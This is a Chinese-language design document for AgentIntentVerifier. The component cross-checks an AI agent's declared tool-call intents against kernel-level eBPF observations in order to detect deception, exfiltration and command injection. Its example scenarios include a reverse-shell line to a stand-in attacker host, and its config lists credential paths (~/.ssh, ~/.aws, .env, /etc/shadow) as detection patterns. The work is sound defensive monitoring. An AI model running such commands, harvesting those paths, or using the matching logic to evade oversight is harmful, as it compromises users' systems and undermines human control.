# AgentIntentVerifier 设计文档

## 概述

**名称**: AgentIntentVerifier
**目的**: 将 Agent 在 LLM API 工具调用中声明的意图与 eBPF 实际观测到的行为进行比对，检测意图-行为不一致（Intent-Behavior Mismatch, IBM），是介于"Agent 说了什么"和"内核看到了什么"之间的安全验证层。
**集成点**: 插入 analyzer 管道的 `AnomalyDetection` 阶段（stage 3），消费 `CausalLinking` 和 `InjectionDetection` 阶段产出的语义化事件。

## 动机

当前框架已具备丰富的能力：
- `HTTPParser` + `SSEProcessor` 可提取 Agent 的工具调用及其参数（声明意图）
- eBPF 探针（ssl、process、file_access）可捕获 Agent 的实际系统行为
- `CredentialLeak` 检测凭证泄露，`HandoffInjectionAnalyzer` 检测 handoff 注入

但缺少一个关键的交叉验证层：**Agent 声称要做的事情，和它实际做的事情，是否一致？**

典型攻击场景：
1. **工具参数欺骗**: Agent 声称 `read_file("/etc/hosts")`，实际执行 `write_file("/etc/passwd")`
2. **网络目标隐瞒**: Agent 声称调用 `web_search("天气")`，实际向 `internal-api.corp:443` 发起连接
3. **子进程伪装**: Agent 声称运行 `npm test`，实际 spawn 了 `nc -e /bin/sh attacker.com 4444`
4. **文件访问越权**: Agent 声称读取配置文件，实际遍历 `~/.ssh/` 目录收集密钥

AgentIntentVerifier 填补这一空白，通过交叉验证 LLM 层面的声明意图与内核层面的观测行为，发现隐蔽的攻击活动。

## 接口设计

### 核心结构

```rust
use std::collections::{HashMap, VecDeque};
use std::sync::Arc;
use tokio::sync::Mutex;

/// 意图记录 — 从工具调用参数中提取的 Agent 声明意图
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeclaredIntent {
    /// 唯一意图 ID: "{request_id}:{tool_call_index}"
    pub intent_id: String,
    /// 发起该意图的 Agent PID
    pub agent_pid: u32,
    /// 工具名称 (e.g., "read_file", "execute_command", "web_search")
    pub tool_name: String,
    /// 工具参数中提取的关键操作目标
    pub targets: Vec<IntentTarget>,
    /// 意图声明时间 (epoch ns)
    pub declared_at_ns: u64,
    /// 意图有效窗口 (ns) — 超出后不再匹配
    pub validity_window_ns: u64,
}

/// 意图目标 — 从工具参数中提取的操作对象
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum IntentTarget {
    /// 文件路径: 声称要操作的文件
    FilePath {
        path: String,
        operation: FileOperation,
    },
    /// 域名/URL: 声称要访问的网络目标
    NetworkTarget {
        host: String,
        port: Option<u16>,
        scheme: String,
    },
    /// 命令: 声称要执行的命令（含参数前缀）
    Command {
        binary: String,
        args_prefix: Vec<String>,
    },
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum FileOperation {
    Read,
    Write,
    ReadWrite,
    Delete,
}

/// 意图-行为不匹配记录
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct IntentBehaviorMismatch {
    /// 关联的意图 ID
    pub intent_id: String,
    /// 不匹配类型
    pub mismatch_type: MismatchType,
    /// 严重级别
    pub severity: MismatchSeverity,
    /// 声明的内容 (Agent 说了什么)
    pub declared: serde_json::Value,
    /// 实际观测的内容 (eBPF 看到了什么)
    pub observed: serde_json::Value,
    /// 不匹配描述
    pub description: String,
    /// 检测时间 (epoch ns)
    pub detected_at_ns: u64,
    /// 涉事 Agent PID
    pub agent_pid: u32,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum MismatchType {
    /// 工具名不匹配: 声称调用 A 工具，行为匹配到 B 工具的典型模式
    ToolMismatch,
    /// 文件路径越权: 声称读文件 A，实际访问了文件 B（且 B 是敏感路径）
    FilePathEscalation,
    /// 网络目标偏离: 声称访问域名 A，实际连接到 IP/域名 B
    NetworkDeviation,
    /// 命令注入: 声称执行命令 A，实际 spawn 的命令包含额外参数或不同二进制
    CommandDeviation,
    /// 未声明的额外行为: Agent 有未通过任何工具调用声明过的系统操作
    UndeclaredBehavior,
    /// 声明但未执行: Agent 声称要做某操作但在有效窗口内未观测到对应行为（可能是占位/欺骗）
    DeclaredButNotExecuted,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, PartialOrd)]
pub enum MismatchSeverity {
    /// 信息级别: 轻微偏差，可能是 API 格式差异或别名
    Info,
    /// 警告级别: 中度偏差，需要关注但可能是正常行为
    Warning,
    /// 严重: 明显的行为偏离，可能是攻击迹象
    Critical,
}
```

### 分析器配置

```rust
#[derive(Debug, Clone)]
pub struct AgentIntentVerifierConfig {
    /// 意图有效窗口 (ns) — Agent 声明意图后多久内的行为才视为相关
    pub intent_validity_ns: u64,
    /// 最大并发追踪的意图数 (LRU 淘汰)
    pub max_pending_intents: usize,
    /// 敏感文件路径模式 — 若实际访问路径匹配这些模式且与声明不符，提升严重级别
    pub sensitive_path_patterns: Vec<String>,
    /// 网络目标白名单 — 这些域名的连接不触发警报
    pub network_allowlist: Vec<String>,
    /// 是否对命令参数做模糊匹配（容忍 --flag=value vs --flag value 等差异）
    pub fuzzy_command_matching: bool,
    /// 是否发出 mismatch 事件
    pub emit_mismatches: bool,
    /// 是否在 drain() 时输出未解决的意图统计
    pub emit_unresolved_summary: bool,
    /// 未声明行为的时间窗口 (ns) — 用于 UndeclaredBehavior 检测
    pub undeclared_window_ns: u64,
    /// 最小行为计数阈值 — 窗口中至少这么多未声明行为才触发告警
    pub undeclared_behavior_threshold: usize,
}

impl Default for AgentIntentVerifierConfig {
    fn default() -> Self {
        Self {
            intent_validity_ns: 30_000_000_000,       // 30 秒
            max_pending_intents: 5_000,
            sensitive_path_patterns: vec![
                "/etc/passwd".into(),
                "/etc/shadow".into(),
                "/root/.ssh/".into(),
                "/home/*/.ssh/".into(),
                "/home/*/.aws/".into(),
                "/home/*/.config/gh/".into(),
                "*.env".into(),
                "*.pem".into(),
            ],
            network_allowlist: vec![
                "api.anthropic.com".into(),
                "api.openai.com".into(),
            ],
            fuzzy_command_matching: true,
            emit_mismatches: true,
            emit_unresolved_summary: true,
            undeclared_window_ns: 120_000_000_000,     // 2 分钟
            undeclared_behavior_threshold: 5,
        }
    }
}
```

### Analyzer trait 实现

```rust
/// 分析器主体
pub struct AgentIntentVerifier {
    config: AgentIntentVerifierConfig,
    /// 活跃意图: intent_id -> DeclaredIntent
    active_intents: HashMap<String, DeclaredIntent>,
    /// 已解决的意图历史 (环形缓冲区)
    resolved_history: VecDeque<ResolvedIntent>,
    /// 每个 Agent 的未声明行为计数器: agent_pid -> (window_start_ns, count)
    undeclared_tracker: HashMap<u32, (u64, usize)>,
    /// 路径规范化缓存
    path_cache: HashMap<String, String>,
    /// 敏感路径正则 (编译后)
    sensitive_path_regex: Vec<regex::Regex>,
    /// 统计数据
    stats: VerifierStats,
}

#[derive(Debug, Clone, Default, Serialize)]
pub struct VerifierStats {
    pub intents_declared: u64,
    pub intents_resolved_match: u64,
    pub intents_resolved_mismatch: u64,
    pub intents_expired_unresolved: u64,
    pub mismatches_by_type: HashMap<String, u64>,
    pub mismatches_by_severity: HashMap<String, u64>,
    pub undeclared_alerts: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct ResolvedIntent {
    intent: DeclaredIntent,
    outcome: IntentOutcome,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
enum IntentOutcome {
    /// 行为与意图一致
    Matched,
    /// 行为与意图不一致 (含具体 mismatch)
    Mismatched(IntentBehaviorMismatch),
    /// 有效窗口内未观测到相关行为
    Expired,
}
```

```rust
#[async_trait]
impl Analyzer for AgentIntentVerifier {
    async fn process(
        &mut self,
        stream: EventStream,
    ) -> Result<EventStream, AnalyzerError>;

    fn name(&self) -> &str {
        "AgentIntentVerifier"
    }
}

impl AnalyzerLifecycle for AgentIntentVerifier {
    fn on_attach(&mut self, stage: PipelineStage) -> Result<(), String> {
        // 编译敏感路径正则
        self.compile_sensitive_patterns()?;
        Ok(())
    }

    fn on_stop(&mut self) -> Result<(), String> {
        // 将所有过期意图标记为 Expired
        // 输出未解决的意图摘要
        Ok(())
    }
}

impl DrainableAnalyzer for AgentIntentVerifier {
    fn drain(&mut self) -> Vec<Event> {
        // 输出所有过期但未解决的意图统计事件
        // 输出每个 Agent 的未声明行为摘要
        let mut events = Vec::new();
        if self.config.emit_unresolved_summary {
            events.push(self.build_summary_event());
        }
        events
    }

    fn has_buffered_events(&self) -> bool {
        !self.active_intents.is_empty()
            || self.undeclared_tracker.values().any(|(_, c)| *c > 0)
    }
}

impl StreamContractProvider for AgentIntentVerifier {
    fn output_contract(&self) -> StreamContract {
        StreamContract::non_preserving()  // 额外发出 intent_mismatch 事件
    }
}
```

## 数据流

```
              Input Stream (混合事件源)
    ┌────────────┼────────────┬─────────────┐
    │            │            │             │
    ▼            ▼            ▼             ▼
[tool_call]  [process]   [ssl/http]   [file_access]
    │            │            │             │
    │   ┌────────┴────────┐   │             │
    │   │ 按 agent_pid    │   │             │
    │   │ 分发到对应意图  │   │             │
    │   └────────┬────────┘   │             │
    │            │            │             │
    ▼            ▼            ▼             ▼
┌──────────────────────────────────────────────────┐
│              AgentIntentVerifier                  │
│                                                   │
│  ┌───────────────┐  ┌─────────────────────────┐  │
│  │ 意图提取器     │  │ 行为观测匹配引擎        │  │
│  │               │  │                         │  │
│  │ tool_call →   │  │ process.exec →          │  │
│  │ DeclaredIntent│  │   匹配 Command intent    │  │
│  │ 存入          │  │                         │  │
│  │ active_intents│  │ file_access →           │  │
│  └───────────────┘  │   匹配 FilePath intent   │  │
│                     │                         │  │
│                     │ ssl.connect/write →     │  │
│                     │   匹配 NetworkTarget    │  │
│                     └───────────┬─────────────┘  │
│                                 │                 │
│                     ┌───────────▼─────────────┐  │
│                     │ 不匹配判定引擎           │  │
│                     │                         │  │
│                     │ 1. 路径与声明不符？      │  │
│                     │ 2. 网络目标偏离？        │  │
│                     │ 3. 命令参数注入？        │  │
│                     │ 4. 未声明的额外行为？    │  │
│                     └───────────┬─────────────┘  │
│                                 │                 │
│                     ┌───────────▼─────────────┐  │
│                     │ 严重级别评估             │  │
│                     │ - 敏感路径 → Critical    │  │
│                     │ - 非白名单域名 → Warning │  │
│                     │ - 参数差异小 → Info      │  │
│                     └───────────┬─────────────┘  │
│                                 │                 │
└─────────────────────────────────┼─────────────────┘
                                  │
                                  ▼
              Output Stream
    (原始事件 + intent_mismatch 事件)
    source: "intent_mismatch"
```

### 处理流程详解

#### 阶段 1: 意图提取

从 `source: "tool_call"` 事件（由 ToolExecutionTracker 产生）或直接从 `http_parser` 事件的请求体中提取意图：

| 工具名模式 | 提取的目标类型 | 提取逻辑 |
|-----------|---------------|---------|
| `read_file`, `write_to_file`, `edit_file` | `FilePath` | 从 `file_path`/`path` 参数提取，根据工具名推断操作类型 |
| `execute_command`, `bash`, `shell` | `Command` | 从 `command` 参数提取，解析二进制名和前 N 个参数 |
| `web_search`, `web_fetch`, `browser` | `NetworkTarget` | 从 `url`/`query` 参数提取 host |
| `search`, `grep`, `glob` | `FilePath` | 从 `path`/`directory` 参数提取，推断为 Read |

提取后创建 `DeclaredIntent`，存入 `active_intents`（key = `intent_id`）。

#### 阶段 2: 行为观测与匹配

对每个非意图来源的输入事件，尝试匹配到活跃意图：

**文件访问事件** (`source: "file_access"`, `source: "process"` with `event_type: "file_open"`):
```
1. 从 active_intents 中筛选同一 agent_pid 的 FilePath 意图
2. 对每个候选意图:
   a. 规范化观测路径 (realpath, 移除 ../, 处理符号链接)
   b. 与意图声明的路径比较:
      - 完全匹配 → Matched
      - 观测路径包含敏感模式且与声明路径不同 → FilePathEscalation
      - 观测操作类型与声明不一致 → FilePathEscalation
3. 已匹配的意图移入 resolved_history
```

**进程事件** (`source: "process"` with `event_type: "exec"`):
```
1. 从 active_intents 中筛选同一 agent_pid 的 Command 意图
2. 对每个候选意图:
   a. 提取观测的 binary 名称
   b. 与意图声明的 binary 比较 (basename 匹配)
   c. 若 fuzzy_command_matching=true:
      - 对参数做归一化后比较 (展开短选项、统一引号)
      - 若观测命令包含额外参数 → CommandDeviation
   d. 若 binary 完全不匹配 → ToolMismatch
3. 已匹配的意图移入 resolved_history
```

**网络事件** (`source: "ssl"`, `source: "http_parser"`):
```
1. 从 SSL 连接的 SNI 或 HTTP Host 头提取目标 host
2. 从 active_intents 中筛选同一 agent_pid 的 NetworkTarget 意图
3. 比较:
   a. host 匹配 → Matched
   b. host 不匹配且不在 allowlist 中 → NetworkDeviation
```

#### 阶段 3: 不匹配判定与严重级别评估

```
判定矩阵:
┌─────────────────────┬──────────────────┬──────────────────────┐
│ 条件                │ MismatchType      │ Severity             │
├─────────────────────┼──────────────────┼──────────────────────┤
│ 观测路径 = 敏感路径  │ FilePathEscalation│ Critical             │
│ 且 ≠ 声明路径       │                  │                      │
├─────────────────────┼──────────────────┼──────────────────────┤
│ 观测域名 ≠ 声明域名  │ NetworkDeviation  │ Warning (非白名单)   │
│ 且 ≠ 白名单         │                  │ Info (白名单)        │
├─────────────────────┼──────────────────┼──────────────────────┤
│ 观测命令 binary 相同 │ CommandDeviation  │ Critical (额外参数含 │
│ 但参数包含注入特征   │                  │ 管道/重定向/反引号)  │
│                     │                  │ Warning (其他差异)   │
├─────────────────────┼──────────────────┼──────────────────────┤
│ 无对应声明意图的    │ UndeclaredBehavior│ Warning (超阈值)     │
│ 系统操作            │                  │ Info (未超阈值)      │
├─────────────────────┼──────────────────┼──────────────────────┤
│ 意图过期未被匹配    │ DeclaredButNot    │ Warning              │
│                     │ Executed         │                      │
└─────────────────────┴──────────────────┴──────────────────────┘
```

#### 阶段 4: 未声明行为追踪

对每个事件，检查是否匹配任何活跃意图。若不匹配且在 `undeclared_window_ns` 内累计超过阈值，发出 `UndeclaredBehavior` 告警：

```
1. 对每个非意图来源事件:
   a. 检查是否匹配任何 active_intents
   b. 若不匹配 → 累加 agent_pid 对应的 undeclared_tracker 计数
   c. 若超过 undeclared_behavior_threshold → 发出 mismatch 事件
   d. 若超出 undeclared_window_ns → 重置计数器
```

## 输出事件格式

### intent_mismatch 事件

```json
{
  "timestamp": 1717000002000,
  "source": "intent_mismatch",
  "pid": 12345,
  "comm": "claude",
  "data": {
    "intent_id": "req_abc123:0",
    "mismatch_type": "FilePathEscalation",
    "severity": "Critical",
    "declared": {
      "tool_name": "read_file",
      "target": {"FilePath": {"path": "/home/user/config.toml", "operation": "Read"}}
    },
    "observed": {
      "source": "file_access",
      "path": "/etc/passwd",
      "operation": "Read",
      "event_type": "file_open"
    },
    "description": "Agent claimed to read /home/user/config.toml but actual file access was /etc/passwd (sensitive path)",
    "agent_pid": 12345,
    "sensitive_path_match": "/etc/passwd"
  }
}
```

### intent_verifier_summary 事件 (drain 时输出)

```json
{
  "timestamp": 1717000100000,
  "source": "intent_verifier_summary",
  "pid": 0,
  "comm": "",
  "data": {
    "total_intents_declared": 128,
    "matched": 115,
    "mismatched": 8,
    "expired_unresolved": 5,
    "mismatches_by_type": {
      "FilePathEscalation": 3,
      "NetworkDeviation": 2,
      "CommandDeviation": 1,
      "UndeclaredBehavior": 2
    },
    "mismatches_by_severity": {
      "Critical": 3,
      "Warning": 4,
      "Info": 1
    },
    "per_agent": {
      "12345": {
        "total_intents": 45,
        "mismatches": 3,
        "undeclared_behaviors": 12
      }
    }
  }
}
```

## 管道集成

### 阶段分配

`AnomalyDetection` 阶段（stage 3），与 `MultiAgentAnomalyAnalyzer` 同级：

```rust
// PipelineBuilderImpl 中注册
builder.add_anomaly_detector(Box::new(AgentIntentVerifier::new(
    AgentIntentVerifierConfig::default()
)));
```

### 上游依赖

| 依赖分析器 | 产出事件源 | 用途 |
|-----------|-----------|------|
| ToolExecutionTracker (计划中) | `tool_call` | 提取 Agent 的工具调用意图 |
| HTTPParser | `http_parser` | 兜底：从请求体直接解析意图 |
| FileAccessAuditAnalyzer | `file_access` | 文件访问行为观测 |
| ProcessRunner (原始) | `process` | 进程 exec/fork 行为观测 |
| SSL/HTTP (原始) | `ssl`, `http_parser` | 网络行为观测 |

### 下游消费者

- `AlertEnrichmentAnalyzer` (stage 4) — 消费 `intent_mismatch` 事件，进行去重、富化、聚合
- `ResponsibilityRuntime` — 将 mismatch 事件纳入责任追溯图

### I/O 契约

| 维度 | 输入 | 输出 |
|------|------|------|
| 消费事件源 | `tool_call`, `http_parser`, `file_access`, `process`, `ssl` | — |
| 产出事件源 | — | `intent_mismatch`, `intent_verifier_summary` |
| 流长度 | — | 非保持（额外发出 mismatch 事件） |
| 单调性 | 保持 | 保持 |
| 状态 | — | 有状态（活跃意图追踪） |
| Drainable | — | 是（输出未解决意图和统计数据） |

## 边界情况与错误处理

| 场景 | 处理策略 |
|------|---------|
| **EC-AIV-1**: 一个 Agent 同时有多个活跃意图 | 按时间顺序匹配，先声明的意图优先。若事件可匹配多个意图，选择目标相似度最高的 |
| **EC-AIV-2**: 工具调用参数格式异常（非标准 JSON） | 跳过该意图提取，记录 `parse_error` 计数。不 panic |
| **EC-AIV-3**: 意图有效窗口到期但未匹配到任何行为 | 标记为 `Expired`，若 `emit_unresolved_summary=true`，在 drain 时纳入统计 |
| **EC-AIV-4**: 单个行为匹配到多个意图（歧义） | 选择 `declared_at_ns` 最近（最新）的意图。如果匹配质量等同，选择第一个 |
| **EC-AIV-5**: 观测路径包含符号链接 | 若 `path_cache` 有缓存则用缓存，否则尝试 `realpath` 解析。解析失败时用原始路径 |
| **EC-AIV-6**: 网络连接无 SNI/Host header | 仅用 IP 地址匹配。若声明的是域名，尝试反向 DNS 或跳过匹配 |
| **EC-AIV-7**: active_intents 溢出 | LRU 淘汰最旧的意图，记录 `dropped_intents` 计数 |
| **EC-AIV-8**: 声明包含通配符路径 (如 `*.toml`) | 将通配符转换为正则，对观测路径做 glob 匹配。匹配成功则视为 Matched |
| **EC-AIV-9**: 命令参数包含 shell 元字符 (|, ;, `, $()) | 自动提升为 Critical 级别，判定为 CommandDeviation |

## 性能考量

- **内存**: O(max_pending_intents + resolved_history + undeclared_tracker)
  - 每个 `DeclaredIntent` ~1KB（含 targets 向量）
  - 默认配置峰值内存 ~5MB (5,000 intents × 1KB)
  - `path_cache` 限制为 10,000 条目
- **CPU**:
  - 非 tool_call/file/process/ssl 事件: O(1) — 快速路径，静默透传
  - tool_call 事件: O(tool_count × targets_per_tool) — 意图提取
  - 行为事件: O(active_intents 中同 agent_pid 的数量) — 平均 <10
  - 正则匹配：敏感路径正则数量固定（~10），每个事件匹配开销恒定
- **清理策略**:
  - 每次 `process()` 调用时扫描 `active_intents`，淘汰过期意图 O(n)
  - `undeclared_tracker` 在每次 `process()` 时清理过期窗口

## 配置示例

```rust
// 默认配置 — 适用于大多数场景
let verifier = AgentIntentVerifier::new(AgentIntentVerifierConfig::default());

// 严格安全模式 — 生产环境
let verifier = AgentIntentVerifier::new(AgentIntentVerifierConfig {
    intent_validity_ns: 15_000_000_000,     // 15s 短窗口
    max_pending_intents: 2_000,
    fuzzy_command_matching: false,           // 精确匹配
    undeclared_behavior_threshold: 3,        // 更敏感的未声明行为检测
    ..Default::default()
});

// 开发模式 — 减少噪音
let verifier = AgentIntentVerifier::new(AgentIntentVerifierConfig {
    intent_validity_ns: 60_000_000_000,     // 60s 长窗口
    undeclared_behavior_threshold: 20,       // 更高的未声明行为容忍度
    emit_unresolved_summary: false,          // 不输出未解决摘要
    ..Default::default()
});
```

## 测试策略

### 单元测试

1. **意图提取** — 从 tool_call event 正确提取 FilePath/Command/NetworkTarget
2. **文件路径匹配** — 声明路径与实际路径的比较逻辑（精确匹配、glob 匹配、规范化）
3. **命令匹配** — binary 匹配 + 参数差异检测（含 fuzzy 模式）
4. **网络目标匹配** — host/port/scheme 匹配逻辑
5. **不匹配判定** — 各 MismatchType 正确触发
6. **严重级别评估** — 敏感路径 → Critical，白名单 → Info 等
7. **意图过期** — 超 window 后正确移入 Expired
8. **未声明行为追踪** — 累计超阈值后正确触发告警
9. **LRU 淘汰** — 意图溢出时淘汰最旧条目
10. **非标准参数格式** — 畸形 JSON 不 panic

### 集成测试

1. **完整文件路径偏离场景** — Agent 声明读 config.toml 但实际读 /etc/passwd
2. **命令注入场景** — Agent 声明 `npm test` 但实际 spawn `nc -e /bin/sh`
3. **网络偏离场景** — Agent 声明搜索天气 API 但连接到内部地址
4. **正常场景（无告警）** — Agent 行为完全符合声明
5. **并发意图** — 同一 Agent 多个工具调用交错执行
6. **跨 Agent 隔离** — Agent A 的行为不误匹配到 Agent B 的意图

### 边界测试

1. 空 tool_call JSON → 无意图提取
2. 超大工具参数 (1MB+) → 截断处理
3. 符号链接路径 → 正确规范化比较
4. 通配符路径声明 → glob 匹配
5. 无 SNI 的网络连接 → 回退 IP 匹配

## 未来扩展

- **行为预测**: 基于历史意图-行为模式，在 Agent 声明意图时预测其可能的实际行为范围
- **差异化采样**: 对不同 Agent（主 Agent vs 子 Agent）应用不同的验证严格度
- **联邦学习基线**: 跨多个 AgentSight 实例共享意图-行为模式指纹，识别新型攻击
- **与 ResponsibilityGraph 深度集成**: 将意图-行为不匹配作为因果链的关键节点，增强责任追溯的证据链强度
- **自然语言意图理解**: 使用 SemanticObserver 增强意图提取，处理非标准工具调用格式中的隐含意图
